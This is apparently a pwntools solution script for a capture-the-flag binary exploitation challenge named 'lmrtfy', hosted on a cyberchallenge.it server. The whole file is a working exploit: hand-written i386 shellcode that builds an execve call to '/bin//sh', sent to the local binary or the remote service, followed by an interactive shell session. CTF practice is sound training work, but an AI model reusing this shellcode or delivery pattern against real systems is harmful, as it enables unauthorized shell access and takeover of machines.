from pwn import *

BIN: str = "./lmrtfy"
HOST: str = "lmrtfy.challs.cyberchallenge.it"
PORT: int = 9124

SHELLCODE = """
push 0x0b
pop eax
cdq
push edx
push 0x68732f2f
push 0x6e69622f
mov ebx,esp
xor ecx,ecx
push 0x08049444
ret
"""
SHELLCODE_ASM = asm(SHELLCODE, arch = 'i386', os = 'linux')

def get_target():
  if args.REMOTE:
    return connect(HOST, PORT)
  else:
    return process(BIN)

def main():
  p = get_target()
  payload = SHELLCODE_ASM
  p.sendline(payload)
  print(p.clean())
  p.interactive()

if __name__ == "__main__":
  main()